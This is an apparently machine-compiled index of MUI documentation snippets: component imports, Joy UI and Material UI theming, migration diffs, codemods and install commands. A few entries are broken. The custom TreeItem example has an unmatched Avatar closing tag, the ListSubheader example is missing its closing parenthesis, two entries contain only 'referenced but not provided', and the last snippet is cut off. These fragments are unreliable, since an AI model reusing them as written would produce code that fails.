  unit: string;
  variant?: 'outlined';
}

interface StatOwnerState extends StatProps {
  // …key value pairs for the internal state that you want to style the slot
  // but don't want to expose to the users
}

----------------------------------------

TITLE: Importing Components from Different Material-UI Versions
DESCRIPTION: Example of importing components from both v0.x and v1.x of Material-UI in the same file.

LANGUAGE: javascript
CODE:
import FlatButton from 'material-ui/FlatButton'; // v0.x
import Button from '@material-ui/core/Button'; // v1.x

----------------------------------------

TITLE: Creating New CSS Variables in Joy UI
DESCRIPTION: This snippet shows how to create new CSS variables using raw theme values in Joy UI.

LANGUAGE: js
CODE:
const Div = styled('div')(({ theme }) => ({
  // Note that it's using `theme.shadow`, not `theme.vars.shadow`
  boxShadow: theme.shadow.sm.replace(/,/g, ', inset'),
}));

----------------------------------------

TITLE: Webpack Configuration for SVG Icons
DESCRIPTION: Configuration for using SVG files as React components with webpack

LANGUAGE: jsx
CODE:
// webpack.config.js
{
  test: /\.svg$/,
  use: ['@svgr/webpack'],
}

// ---
import StarIcon from './star.svg';

<SvgIcon component={StarIcon} inheritViewBox />

----------------------------------------

TITLE: Customizing Delete Icon in React Chips
DESCRIPTION: Demonstrates how to use a custom delete icon in Chip components.

LANGUAGE: JSX
CODE:
{"demo": "CustomDeleteIconChips.js"}

----------------------------------------

TITLE: Adding Title Bars to Image List in React
DESCRIPTION: This example demonstrates the use of the ImageListItemBar component to add an overlay to each item in the image list. The overlay can include a title, subtitle, and secondary action like an IconButton.

LANGUAGE: JSX
CODE:
{"demo": "TitlebarImageList.js"}

----------------------------------------

TITLE: Popper Placement Configuration
DESCRIPTION: Example showing how to customize the Popper's placement using the placement prop. Default placement is bottom.

LANGUAGE: jsx
CODE:
{"demo": "PlacementPopper.js"}

----------------------------------------

TITLE: Using clsx Utility for Conditional Class Names
DESCRIPTION: This snippet demonstrates how to use the clsx utility to construct conditional class names in a more concise and readable way.

LANGUAGE: jsx
CODE:
import clsx from 'clsx';

return (
  <div
    className={clsx('MuiButton-root', {
      'Mui-disabled': disabled,
      'Mui-selected': selected,
    })}
  />
);

----------------------------------------

TITLE: Custom ListSubheader Component Implementation
DESCRIPTION: Demonstrates how to implement a custom ListSubheader component with proper MUI integration using the muiSkipListHighlight static property.

LANGUAGE: tsx
CODE:
function MyListSubheader(props: ListSubheaderProps) {
  return <ListSubheader {...props} />;
}

MyListSubheader.muiSkipListHighlight = true;
export default MyListSubheader;

// elsewhere:

return (
  <Select>
    <MyListSubheader>Group 1</MyListSubheader>
    <MenuItem value={1}>Option 1</MenuItem>
    <MenuItem value={2}>Option 2</MenuItem>
    <MyListSubheader>Group 2</MyListSubheader>
    <MenuItem value={3}>Option 3</MenuItem>
    <MenuItem value={4}>Option 4</MenuItem>
  </Select>

----------------------------------------

TITLE: Manual Label and ID Association for Textarea
DESCRIPTION: Example showing how to manually associate a label with a textarea using htmlFor and id attributes for accessibility purposes.

LANGUAGE: jsx
CODE:
<label htmlFor="unique-id">Label</label>
<Textarea
  slotProps={{
    textarea: {
      id: 'unique-id',
    }
  }}
/>

----------------------------------------

TITLE: Updating useThemeVariants import
DESCRIPTION: Change useThemeVariants import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { useThemeVariants } from '@mui/material/styles';
+import { useThemeVariants } from '@mui/styles';

----------------------------------------

TITLE: Enabling CSS Variables in Material UI v6 Theme
DESCRIPTION: Demonstrates how to enable CSS variables generation in a Material UI v6 theme using the cssVariables flag.

LANGUAGE: javascript
CODE:
const theme = createTheme({ cssVariables: true, ... });

----------------------------------------

TITLE: Adding Custom Shadow Tokens
DESCRIPTION: Shows how to add new custom shadow tokens to the Joy UI theme system. Creates additional shadow variants beyond the default set.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  shadow: {
    subtle: '{CSS box-shadow}',
    strong: '{CSS box-shadow}',
  },
});

----------------------------------------

TITLE: Popper with Popup State Management in React
DESCRIPTION: Demonstrates the use of the material-ui-popup-state package to manage the state of the Popper component, simplifying the implementation of popups.

LANGUAGE: JavaScript
CODE:
{"demo": "PopperPopupState.js"}

----------------------------------------

TITLE: Importing Toggle Button Group in React
DESCRIPTION: Basic import statement for the Toggle Button Group component from Joy UI package.

LANGUAGE: jsx
CODE:
import ToggleButtonGroup from '@mui/joy/ToggleButtonGroup';

----------------------------------------

TITLE: Customizing CSS Variable Prefixes in Joy UI
DESCRIPTION: This snippet shows how to change the default prefix for CSS variables in Joy UI using the cssVarPrefix property.

LANGUAGE: jsx
CODE:
import { CssVarsProvider, extendTheme } from '@mui/joy/styles';

function App() {
  return (
    <CssVarsProvider theme={extendTheme({ cssVarPrefix: 'company' })}>
      ...
    </CssVarsProvider>
  );
}

----------------------------------------

TITLE: Importing Accordion Components in React
DESCRIPTION: This snippet shows how to import the necessary Accordion-related components from Joy UI. It includes Accordion, AccordionDetails, AccordionGroup, and AccordionSummary.

LANGUAGE: jsx
CODE:
import Accordion from '@mui/joy/Accordion';
import AccordionDetails from '@mui/joy/AccordionDetails';
import AccordionGroup from '@mui/joy/AccordionGroup';
import AccordionSummary from '@mui/joy/AccordionSummary';

----------------------------------------

TITLE: Customizing Tooltip Component with mergeSlotProps in TypeScript
DESCRIPTION: Shows how to create a custom Tooltip component using the mergeSlotProps utility to combine custom props with slot props.

LANGUAGE: tsx
CODE:
import Tooltip, { TooltipProps } from '@mui/material/Tooltip';
import { mergeSlotProps } from '@mui/material/utils';

export const CustomTooltip = (props: TooltipProps) => {
  const { children, title, sx: sxProps } = props;

  return (
    <Tooltip
      {...props}
      title={<Box sx={{ p: 4 }}>{title}</Box>}
      slotProps={{
        ...props.slotProps,
        popper: mergeSlotProps(props.slotProps?.popper, {
          className: 'custom-tooltip-popper',
          disablePortal: true,
          placement: 'top',
        }),
      }}
    >
      {children}
    </Tooltip>
  );
};

----------------------------------------

TITLE: Updating color imports
DESCRIPTION: Change nested color imports to use the main colors export.

LANGUAGE: diff
CODE:
-import red from '@mui/material/colors/red';
+import { red } from '@mui/material/colors';

----------------------------------------

TITLE: Updating Container Import
DESCRIPTION: Move the Container component import from @material-ui/lab to @material-ui/core.

LANGUAGE: diff
CODE:
-import Container from '@material-ui/lab/Container';
+import Container from '@material-ui/core/Container';

----------------------------------------

TITLE: Installing MUI Sign-up Template Dependencies
DESCRIPTION: Lists the required dependencies for using the MUI Sign-up template in a React project. These packages are essential for the template's functionality and styling.

LANGUAGE: markdown
CODE:
@mui/material, @mui/icons-material, @emotion/styled, @emotion/react

----------------------------------------

TITLE: Customizing Image List in React
DESCRIPTION: This snippet shows how to create a custom image list with a customized titlebar positioned at the top, custom gradient background, and secondary action IconButton on the left. It also uses the gap prop to adjust spacing between items.

LANGUAGE: JSX
CODE:
{"demo": "CustomImageList.js", "defaultCodeOpen": false}

----------------------------------------

TITLE: Configuring OG Card Parameters in Markdown
DESCRIPTION: Demonstrates how to override default Open Graph card title and description using markdown frontmatter. Supports highlighting specific text sections using \* delimiters.

LANGUAGE: markup
CODE:
--
cardTitle: A *different* title than the page title
cardDecription: The word "different" on the title is highlighted
--

----------------------------------------

TITLE: Customizing Shadow Colors
DESCRIPTION: Demonstrates how to customize shadow colors for light and dark modes using RGB channel values.

LANGUAGE: javascript
CODE:
import { extendTheme } from '@mui/joy/styles';

const theme = extendTheme({
  colorSchemes: {
    light: {
      shadowChannel: '12 12 12',
    },
    dark: {
      shadowChannel: '0 0 0',
    },
  },
});

----------------------------------------

TITLE: Handling Text Overflow with MUI Box Component in JSX
DESCRIPTION: Shows two methods of handling text overflow using MUI Box component: clipping the text and using ellipsis.

LANGUAGE: jsx
CODE:
<Box component="div" sx={{ textOverflow: 'clip' }}>
  Lorem Ipsum is simply dummy text
</Box>
<Box component="div" sx={{ textOverflow: 'ellipsis' }}>
  Lorem Ipsum is simply dummy text
</Box>

----------------------------------------

TITLE: Installing Base UI with npm
DESCRIPTION: Command to install the Base UI package in a project directory using npm.

LANGUAGE: bash
CODE:
npm install @mui/base

----------------------------------------

TITLE: Customizing Switch Size in React
DESCRIPTION: Illustrates how to change the size of switches using the size prop in Material-UI.

LANGUAGE: jsx
CODE:
{"demo": "SwitchesSize.js"}

----------------------------------------

TITLE: Customizing Input Components with Joy UI in JSX
DESCRIPTION: Shows how to customize Joy UI Input components with end decorators and border radius adjustments, demonstrating automatic adaptation of child components.

LANGUAGE: JSX
CODE:
<Input
  placeholder="password"
  endDecorator={<IconButton size="sm"><Visibility /></IconButton>}
/>

<Input
  size="lg"
  placeholder="password"
  endDecorator={<IconButton><Visibility /></IconButton>}
  sx={{ '--Input-radius': '24px' }}
/>

----------------------------------------

TITLE: Rendering Multi-Tab Demo Container with Inline Background in MUI Docs
DESCRIPTION: Illustrates how to create a demo container with multiple tabs and an inline background in MUI documentation.

LANGUAGE: markdown
CODE:
{"demo": "DemoMultiTabs.js", "bg": "inline" }

----------------------------------------

TITLE: Using CSS Baseline Component in Joy UI
DESCRIPTION: Shows how to use the CSS Baseline component to apply default body-md typography styles globally.

LANGUAGE: jsx
CODE:
<CssBaseline />

// inherits the `theme.typography['body-md']` styles
<p>Hello World</p>

----------------------------------------

TITLE: Using Typography Styles via sx Prop in Joy UI
DESCRIPTION: Example of applying typography styles using the sx prop with the typography property.

LANGUAGE: jsx
CODE:
<Box sx={{ typography: 'body-sm' }}>Small text</Box>

----------------------------------------

TITLE: Basic Spacing Example
DESCRIPTION: Basic example showing different spacing applications using the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ p: 1 }}>…
<Box sx={{ m: 1 }}>…
<Box sx={{ p: 2 }}>…

----------------------------------------

TITLE: Using Container Queries with Material UI v6
DESCRIPTION: Shows how to use container queries in Material UI v6 with styled components and the sx prop.

LANGUAGE: jsx
CODE:
const Component = styled('div')(({ theme }) => ({
  display: 'flex',
  flexDirection: 'column',
  gap: theme.spacing(2),
  [theme.containerQueries.up('sm')]: {
    flexDirection: 'row',
  },
  [theme.containerQueries('sidebar').up('400px')]: {
    flexDirection: 'row',
  },
}));

----------------------------------------

TITLE: Checkbox Component HTML Structure
DESCRIPTION: The basic HTML structure showing the anatomy of the Checkbox component with its nested elements.

LANGUAGE: html
CODE:
<span class="MuiCheckbox-root">
  <span class="MuiCheckbox-checkbox">
    <span class="MuiCheckbox-action">
      <input type="checkbox" class="MuiCheckbox-input" value />
    </span>
  </span>
  <label class="MuiCheckbox-label">
    <!-- label text -->
  </label>
</span>

----------------------------------------

TITLE: Using NextLinkComposed with Material UI Button in Next.js
DESCRIPTION: This example demonstrates how to use the NextLinkComposed component with a Material UI Button in a Next.js environment. It shows how to pass complex href objects as the 'to' prop.

LANGUAGE: tsx
CODE:
import Button from '@mui/material/Button';
import { NextLinkComposed } from '../src/Link';

export default function Index() {
  return (
    <Button
      component={NextLinkComposed}
      to={{
        pathname: '/about',
        query: { name: 'test' },
      }}
    >
      Button link
    </Button>
  );
}

----------------------------------------

TITLE: Importing Input Component in React
DESCRIPTION: Shows how to import the Input component from Joy UI in a React application.

LANGUAGE: jsx
CODE:
import Input from '@mui/joy/Input';

----------------------------------------

TITLE: HTML Structure of MUI Base Select Component
DESCRIPTION: The basic HTML structure generated by the MUI Base Select component, including the root button and popup elements.

LANGUAGE: html
CODE:
<button class="base-Select-root" type="button">Open</button>
<div class="base-Select-popup">
  <ul class="base-Select-listbox">
    <li class="base-Option-root">Option one</li>
    <li class="base-Option-root">Option two</li>
  </ul>
</div>

----------------------------------------

TITLE: Updating Material UI Core Dependency in package.json
DESCRIPTION: Update the @material-ui/core dependency in package.json to version 4.0.0 or higher.

LANGUAGE: json
CODE:
"dependencies": {
  "@material-ui/core": "^4.0.0"
}

----------------------------------------

TITLE: Updating Switch Component Classes
DESCRIPTION: Rename CSS classes for Switch component to match new specification wording.

LANGUAGE: diff
CODE:
-icon
-bar
+thumb
+track

----------------------------------------

TITLE: Typography Component HTML Structure
DESCRIPTION: Basic HTML structure showing how Typography components are rendered in the DOM.

LANGUAGE: html
CODE:
<p class="MuiTypography-root MuiTypography-body-md">
  <!-- Typography content -->
  <span class="MuiTypography-root MuiTypography-inherit">
    <!-- Nested Typography content -->
  </span>
</p>

----------------------------------------

TITLE: Importing Button Component in React
DESCRIPTION: Basic import statement for the MUI Base Button component

LANGUAGE: jsx
CODE:
import { Button } from '@mui/base/Button';

----------------------------------------

TITLE: Customizing Tree Item with useTreeItem2 Hook in React
DESCRIPTION: Shows how to create a custom Tree Item component using the new useTreeItem2 hook. This hook allows for full customization of Tree items while retaining default behaviors and features.

LANGUAGE: jsx
CODE:
const CustomTreeItem = React.forwardRef(function CustomTreeItem(
  props: TreeItem2Props,
  ref: React.Ref<HTMLLIElement>,
) {
  const { id, nodeId, label, disabled, children, ...other } = props;

  const {
    getRootProps,
    getContentProps,
    getIconContainerProps,
    getLabelProps,
    getGroupTransitionProps,
    status,
  } = useTreeItem2({ id, nodeId, children, label, disabled, rootRef: ref });

  // Compose and implement your tree item as you need
  return (
    <TreeItem2Provider nodeId={nodeId}>
      <TreeItem2Root {...getRootProps(other)}>
        <TreeItemContent {...getContentProps()}>
          <TreeItem2IconContainer {...getIconContainerProps()}>
            <TreeItem2Icon status={status} />
          </TreeItem2IconContainer>
          <Box sx={{ flexGrow: 1, display: 'flex', gap: 1 }}>
              {(label as string)[0]}
            </Avatar>
            <TreeItem2Label {...getLabelProps()} />
          </Box>
        </TreeItemContent>
        {children && <TreeItem2GroupTransition {...getGroupTransitionProps()} />}
      </TreeItem2Root>
    </TreeItem2Provider>
  );
});

LANGUAGE: jsx
CODE:
<RichTreeView items={myDataSet} slots={{ item: CustomTreeItem }} />

----------------------------------------

TITLE: Testing API: Retrieving Average Ratings
DESCRIPTION: This curl command demonstrates how to retrieve average feedback for all pages by sending a GET request to the API endpoint.

LANGUAGE: bash
CODE:
curl <API-URL>/feedback/average

----------------------------------------

TITLE: Typography TypeScript Module Augmentation
DESCRIPTION: TypeScript type definitions for custom typography scale values.

LANGUAGE: ts
CODE:
declare module '@mui/joy/styles' {
  interface TypographySystemOverrides {
    subtitle: true;
    label: true;
  }
}

----------------------------------------

TITLE: Updating Lab Component Imports
DESCRIPTION: Execute the codemod to update imports of components moved from @mui/lab to @mui/material in v7.

LANGUAGE: bash
CODE:
npx @mui/codemod@next v7.0.0/lab-removed-components <path/to/folder>

----------------------------------------

TITLE: Installing Material-UI v1.x Alongside v0.x with Yarn
DESCRIPTION: Commands to install both versions of Material-UI using Yarn package manager.

LANGUAGE: bash
CODE:
yarn add material-ui
yarn add @material-ui/core

----------------------------------------

TITLE: Importing MUI Components Using Top-level Imports
DESCRIPTION: Example of the new top-level import syntax for Material-UI components to help minimize bundle size. This approach is recommended for optimal project configuration.

LANGUAGE: javascript
CODE:
import { Button, TextField } from '@mui/material';

----------------------------------------

TITLE: HTML Template Generation
DESCRIPTION: Generates the full HTML document template with injected component markup and critical CSS.

LANGUAGE: javascript
CODE:
function renderFullPage(html, css) {
  return `
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="utf-8" />
        <title>My page</title>
        ${css}
        <meta name="viewport" content="initial-scale=1, width=device-width" />
        <link rel="preconnect" href="https://fonts.googleapis.com" />
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
        <link
          rel="stylesheet"
          href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap"
        />
      </head>
      <body>
        <div id="root">${html}</div>
      </body>
    </html>
  `;
}

----------------------------------------

TITLE: Implementing Dashboard Layout with Toolpad in React
DESCRIPTION: This snippet demonstrates the usage of the DashboardLayout component from @toolpad/core for creating dashboard applications. It handles application layout, theming, and navigation.

LANGUAGE: jsx
CODE:
{"demo": "DashboardLayoutBasic.js", "height": 400, "iframe": true, "defaultExpanded": false}

----------------------------------------

TITLE: Menu with Selected Item
DESCRIPTION: Shows how to implement a menu with a pre-selected item using the selected prop from ListItem.

LANGUAGE: jsx
CODE:
{"demo": "SimpleListMenu.js"}

----------------------------------------

TITLE: Importing Input Component in React
DESCRIPTION: Basic import statement for the Input component from MUI Base UI library.

LANGUAGE: jsx
CODE:
import { Input } from '@mui/base/Input';

----------------------------------------

TITLE: Adding Material-UI Docs Remote Repository
DESCRIPTION: This bash command adds the material-ui-docs remote repository to the local git configuration for deploying documentation.

LANGUAGE: bash
CODE:
git remote add material-ui-docs https://github.com/mui/material-ui-docs.git

----------------------------------------

TITLE: Badge Alignment Configuration in React
DESCRIPTION: Demonstrates badge positioning using the anchorOrigin prop to place badges in different corners.

LANGUAGE: jsx
CODE:
BadgeAlignment.js referenced but not provided

----------------------------------------

TITLE: Importing useInput Hook
DESCRIPTION: Import statement for the useInput hook from MUI Base UI library.

LANGUAGE: js
CODE:
import { useInput } from '@mui/base/useInput';

----------------------------------------

TITLE: Installing MUI Lab Dependencies
DESCRIPTION: Commands to install peer dependencies required by @mui/lab, including Material UI core and Emotion libraries.

LANGUAGE: bash
CODE:
npm install @mui/material@next @emotion/react @emotion/styled

----------------------------------------

TITLE: Basic Textarea Component Implementation in React
DESCRIPTION: Basic implementation of the Textarea component showing the minimum required code to get started. Imports the component from @mui/joy and renders a basic textarea with a placeholder.

LANGUAGE: jsx
CODE:
import Textarea from '@mui/joy/Textarea';

export default function MyApp() {
  return <Textarea placeholder="Type anything…" />;
}

----------------------------------------

TITLE: Removing Vite Alias for MUI Icons
DESCRIPTION: Remove the Vite alias configuration for @mui/icons-material as it's no longer necessary in v7.

LANGUAGE: diff
CODE:
 // vite.config.js
   resolve: {
     alias: [
-      {
-        find: /^@mui\/icons-material\/(.*)/,
-        replacement: "@mui/icons-material/esm/$1",
-      },
     ],
   },

----------------------------------------

TITLE: Manual Migration from TextField to Input Component in Joy UI
DESCRIPTION: This diff shows the manual changes required to replace a TextField component with an Input component, including necessary imports and component structure modifications.

LANGUAGE: diff
CODE:
-import TextField from '@mui/joy/TextField';
+import FormControl from '@mui/joy/FormControl';
+import FormLabel from '@mui/joy/FormLabel';
+import FormHelperText from '@mui/joy/FormHelperText';
+import Input from '@mui/joy/Input';

-<TextField
-  id="Id"
-  label="Label"
-  placeholder="Placeholder"
-  helperText="Help!"
-  name="Name"
-  type="tel"
-  autoComplete="on"
-  autoFocus
-  error
-  required
-  fullWidth
-  defaultValue="DefaultValue"
-  size="sm"
-  color="primary"
-  variant="outlined"
-/>
+<FormControl
+  id="Id"
+  required
+  size="sm"
+  color="primary">
+  <FormLabel>
+    Label
+  </FormLabel>
+  <Input
+    placeholder="Placeholder"
+    name="Name"
+    type="tel"
+    autoComplete="on"
+    autoFocus
+    error
+    fullWidth
+    defaultValue="DefaultValue"
+    variant="outlined" />
+  <FormHelperText>
+    Help!
+  </FormHelperText>
+</FormControl>

----------------------------------------

TITLE: Running JSS to Styled codemod in Material UI v5
DESCRIPTION: Command to run the codemod for migrating JSS styles to styled API in Material UI v5. This transformation increases CSS specificity.

LANGUAGE: bash
CODE:
npx @mui/codemod@latest v5.0.0/jss-to-styled <path>

----------------------------------------

TITLE: Installing Material Icons and Material UI Packages with npm
DESCRIPTION: This command installs the Material Icons package along with its dependencies: Material UI, Emotion styled, and Emotion react. It uses the 'next' tag for @mui/icons-material and @mui/material packages.

LANGUAGE: bash
CODE:
npm install @mui/icons-material@next @mui/material@next @emotion/styled @emotion/react

----------------------------------------

TITLE: Disabling All Transitions and Animations in MUI Theme
DESCRIPTION: This snippet shows how to disable all transitions and animation effects globally in a MUI application by applying CSS overrides to all elements.

LANGUAGE: javascript
CODE:
import { createTheme } from '@mui/material';

const theme = createTheme({
  components: {
    // Name of the component ⚛️
    MuiCssBaseline: {
      styleOverrides: {
        '*, *::before, *::after': {
          transition: 'none !important',
          animation: 'none !important',
        },
      },
    },
  },
});

----------------------------------------

TITLE: Updating Styled Box Component
DESCRIPTION: Examples of updating styled Box component usage.

LANGUAGE: diff
CODE:
-const StyledBox = styled(Box)`
+const StyledDiv = styled('div')`
   color: white;
 `;

LANGUAGE: diff
CODE:
 const StyledBox = styled(Box)`
   color: white;
-`;
+` as typeof Box;

----------------------------------------

TITLE: Setting z-index with MUI Box component in JSX
DESCRIPTION: Demonstrates how to set z-index values using MUI's Box component with the sx prop. The example shows setting z-index to predefined values like 'tooltip' and 'modal'.

LANGUAGE: jsx
CODE:
<Box sx={{ zIndex: 'tooltip' }}>
<Box sx={{ zIndex: 'modal' }}>

----------------------------------------

TITLE: Adding Borders with MUI Box Component in JSX
DESCRIPTION: Demonstrates how to add borders to elements using the MUI Box component with the sx prop. Shows examples for all borders and individual sides.

LANGUAGE: jsx
CODE:
<Box sx={{ border: 1 }}>…
<Box sx={{ borderTop: 1 }}>…
<Box sx={{ borderRight: 1 }}>…
<Box sx={{ borderBottom: 1 }}>…
<Box sx={{ borderLeft: 1 }}>…

----------------------------------------

TITLE: Importing No-SSR Component in React
DESCRIPTION: Shows how to import the No-SSR component from Material-UI. This is the basic step to use the component in a React application.

LANGUAGE: jsx
CODE:
import NoSsr from '@mui/material/NoSsr';

----------------------------------------

TITLE: Box Component Max-width Example
DESCRIPTION: Example showing how to use max-width with breakpoint values in the Box component.

LANGUAGE: jsx
CODE:
<Box sx={{ maxWidth: 'md' }}>…

----------------------------------------

TITLE: Transform Function for Sizing Values in MUI
DESCRIPTION: A utility function that transforms sizing values. Values between 0 and 1 are converted to percentages, while other values are used directly.

LANGUAGE: javascript
CODE:
function transform(value) {
  return value <= 1 && value !== 0 ? `${value * 100}%` : value;
}

----------------------------------------

TITLE: Card Component HTML Structure
DESCRIPTION: Basic HTML structure showing the anatomy of the Card component and its supplementary components

LANGUAGE: html
CODE:
<div class="MuiCard-root">
  <div class="MuiCardCover-root">
    <!-- optional Card Cover layer -->
  </div>
  <div class="MuiCardContent-root">
    <!-- optional Card Content layer -->
  </div>
  <div class="MuiCardOverflow-root">
    <!-- optional Card Overflow utility -->
  </div>
  <div class="MuiCardActions-root">
    <!-- optional Card Actions layer -->
  </div>
</div>

----------------------------------------

TITLE: Using MuiThemeProvider for v0.x and v1.x Simultaneously
DESCRIPTION: React component structure demonstrating how to use theme providers from both Material-UI versions in the same application.

LANGUAGE: jsx
CODE:
import * as React from 'react';
import { MuiThemeProvider, createMuiTheme } from '@material-ui/core/styles'; // v1.x
import { MuiThemeProvider as V0MuiThemeProvider } from 'material-ui';
import getMuiTheme from 'material-ui/styles/getMuiTheme';

const theme = createMuiTheme({
  /* theme for v1.x */
});
const themeV0 = getMuiTheme({
  /* theme for v0.x */
});

function App() {
  return (
    <MuiThemeProvider theme={theme}>
      <V0MuiThemeProvider muiTheme={themeV0}>{/*Components*/}</V0MuiThemeProvider>
    </MuiThemeProvider>
  );
}

export default App;

----------------------------------------

TITLE: Avatar Variants in React MUI
DESCRIPTION: Different avatar shapes (square or rounded) can be achieved using the variant prop.

LANGUAGE: JSX
CODE:
VariantAvatars.js referenced but not provided in the input text

----------------------------------------

TITLE: Updating Theme Spacing Usage
DESCRIPTION: Replace theme.spacing.unit with the new theme.spacing() API for more flexible spacing options.

LANGUAGE: diff
CODE:
 label: {
   [theme.breakpoints.up('sm')]: {
-    paddingTop: theme.spacing.unit * 12,
+    paddingTop: theme.spacing(12),
   },
 }

----------------------------------------

TITLE: Building and Publishing MUI Test Utils Package
DESCRIPTION: Commands for building and publishing the internal test utilities package using pnpm package manager. Includes two-step process of building and publishing to npm.

LANGUAGE: bash
CODE:
pnpm build

LANGUAGE: bash
CODE:
pnpm release:publish

----------------------------------------

TITLE: Configuring MUI Transition Easings
DESCRIPTION: Configuration example showing how to customize transition easing curves in the theme using cubic-bezier functions for different animation scenarios.

LANGUAGE: javascript
CODE:
const theme = createTheme({
  transitions: {
    easing: {
      // This is the most common easing curve.
      easeInOut: 'cubic-bezier(0.4, 0, 0.2, 1)',
      // Objects enter the screen at full velocity from off-screen and
      // slowly decelerate to a resting point.
      easeOut: 'cubic-bezier(0.0, 0, 0.2, 1)',
      // Objects leave the screen at full velocity. They do not decelerate when off-screen.
      easeIn: 'cubic-bezier(0.4, 0, 1, 1)',
      // The sharp curve is used by objects that may return to the screen at any time.
      sharp: 'cubic-bezier(0.4, 0, 0.6, 1)',
    },
  },
});

----------------------------------------

TITLE: Default Material UI Button HTML Output
DESCRIPTION: Example of default HTML output showing class names generated for a basic Material UI Button component.

LANGUAGE: html
CODE:
<button class="MuiButton-root MuiButton-text MuiButton-textPrimary MuiButton-sizeMedium MuiButton-textSizeMedium MuiButtonBase-root css-1ujsas3">
  Text
</button>

----------------------------------------

TITLE: Flex Wrap Properties in MUI Box
DESCRIPTION: Shows various flex-wrap options available for MUI Box components.

LANGUAGE: jsx
CODE:
<Box sx={{ flexWrap: 'nowrap' }}>…
<Box sx={{ flexWrap: 'wrap' }}>…
<Box sx={{ flexWrap: 'wrap-reverse' }}>…

----------------------------------------

TITLE: Configuring CSS Theme Variables for Shadow DOM
DESCRIPTION: This snippet shows how to set up CSS theme variables to work within the shadow DOM by configuring the theme and ThemeProvider component.

LANGUAGE: tsx
CODE:
const theme = createTheme({
  cssVariables: {
    rootSelector: ':host',
    colorSchemeSelector: 'class',
  },
  components: {
    // ...same as above steps
  }
})

<ThemeProvider
  theme={theme}
  colorSchemeNode={shadowRootElement}
>

----------------------------------------

TITLE: Configuring webpack for styled-components with Material UI
DESCRIPTION: This code snippet demonstrates how to modify the webpack.config.js file to alias @mui/styled-engine to @mui/styled-engine-sc when using npm as the package manager.

LANGUAGE: diff
CODE:
 module.exports = {
   //...
+  resolve: {
+    alias: {
+      '@mui/styled-engine': '@mui/styled-engine-sc'
+    },
+  },
 };

----------------------------------------

TITLE: Customizing Number Input Slots in React
DESCRIPTION: This example demonstrates how to override the root slot and interior slots of the Number Input component using the 'slots' prop.

LANGUAGE: jsx
CODE:
<NumberInput
  slots={{
    root: 'aside',
    incrementButton: CustomButton,
    decrementButton: CustomButton,
  }}
/>

----------------------------------------

TITLE: Basic Link Component Import
DESCRIPTION: Shows how to import the Joy UI Link component from the MUI package.

LANGUAGE: jsx
CODE:
import Link from '@mui/joy/Link';

----------------------------------------

TITLE: Importing Border Utilities from MUI System in JavaScript
DESCRIPTION: Shows how to import border-related utilities from the MUI system package for use in custom components or styles.

LANGUAGE: javascript
CODE:
import { borders } from '@mui/system';

----------------------------------------

TITLE: Basic Import of MUI styled() Utility
DESCRIPTION: Shows how to import the styled utility from either @mui/system or @mui/material/styles packages.

LANGUAGE: typescript
CODE:
import { styled } from '@mui/system';
// If you are using @mui/material
import { styled } from '@mui/material/styles';

----------------------------------------

TITLE: Rendering Clickable and Deletable Chips in React
DESCRIPTION: Demonstrates Chip components that are both clickable and deletable.

LANGUAGE: JSX
CODE:
{"demo": "ClickableAndDeletableChips.js"}

----------------------------------------

TITLE: Updating createGenerateClassName import
DESCRIPTION: Change createGenerateClassName import from @mui/material/styles to @mui/styles.

LANGUAGE: diff
CODE:
-import { createGenerateClassName } from '@mui/material/styles';
+import { createGenerateClassName } from '@mui/styles';

----------------------------------------

TITLE: Installing and Running Material UI Gatsby Project
DESCRIPTION: Commands to install project dependencies and start the development server for the Gatsby project.

LANGUAGE: bash
CODE:
npm install
npm run develop

----------------------------------------

TITLE: Customizing Dark Mode Palette in Material UI
DESCRIPTION: Shows how to override the default dark palette with custom colors. This example demonstrates setting a custom primary color for the dark theme.

LANGUAGE: jsx
CODE:
const darkTheme = createTheme({
  palette: {
    mode: 'dark',
    primary: {
      main: '#ff5252',
    },
  },
});

----------------------------------------

TITLE: Initializing ClassNameGenerator Configuration
DESCRIPTION: Basic setup for customizing Material UI component class names using ClassNameGenerator API.

LANGUAGE: javascript
CODE:
import { unstable_ClassNameGenerator as ClassNameGenerator } from '@mui/material/className';

ClassNameGenerator.configure(
  // Do something with the componentName
  (componentName) => componentName,
);

----------------------------------------

TITLE: Basic Popper Component Usage
DESCRIPTION: Example demonstrating basic usage of the Popper component with the UnstyledPopperBasic demo. Component renders content in a Portal when open prop is true.

LANGUAGE: jsx
CODE:
{"demo": "UnstyledPopperBasic", "defaultCodeOpen": true}

----------------------------------------

TITLE: Configuring Pigment CSS in Next.js
DESCRIPTION: Importing and applying the Pigment CSS plugin in a Next.js configuration file.

LANGUAGE: javascript
CODE:
// next.config.js
import { withPigment } from '@pigment-css/nextjs-plugin';

export default withPigment(nextConfig);

----------------------------------------

TITLE: Adding letter spacing scale to theme
DESCRIPTION: Code to add the removed letter spacing scale back to the Joy UI theme.

LANGUAGE: javascript
CODE:
extendTheme({
  letterSpacing: {
    sm: '-0.01em',
    md: '0.083em',
    lg: '0.125em',
  },
});

----------------------------------------

TITLE: Custom Storage Manager Implementation
DESCRIPTION: Shows how to implement a custom storage manager for persisting color scheme preferences. Includes TypeScript type definitions and basic structure.

LANGUAGE: tsx
CODE:
import { ThemeProvider, createTheme } from '@mui/material/styles';
import type { StorageManager } from '@mui/material/styles';

const theme = createTheme({
  colorSchemes: {
    dark: true,
  },
});

function storageManager(params): StorageManager {
  return {
    get: (defaultValue) => {
      // Your implementation
    },
    set: (value) => {
      // Your implementation
    },
    subscribe: (handler) => {
      // Your implementation
      return () => {
        // cleanup
      };
    },
  };
}

function App() {
  return (
    <ThemeProvider theme={theme} storageManager={storageManager}>
      ...
    </ThemeProvider>
  );
}

----------------------------------------

TITLE: Downloading Material UI Gatsby Example
DESCRIPTION: Commands to download and extract the Material UI Gatsby example project from GitHub repository.

LANGUAGE: bash
CODE:
curl https://codeload.github.com/mui/material-ui/tar.gz/master | tar -xz --strip=2  material-ui-master/examples/material-ui-gatsby
cd material-ui-gatsby

----------------------------------------

TITLE: Implementing Custom Data Grid with ApiRef in TSX
DESCRIPTION: Example showing how to use the newly MIT-licensed apiRef feature to programmatically control Data Grid functionality like pagination.

LANGUAGE: tsx
CODE:
function CustomDataGrid(props) {
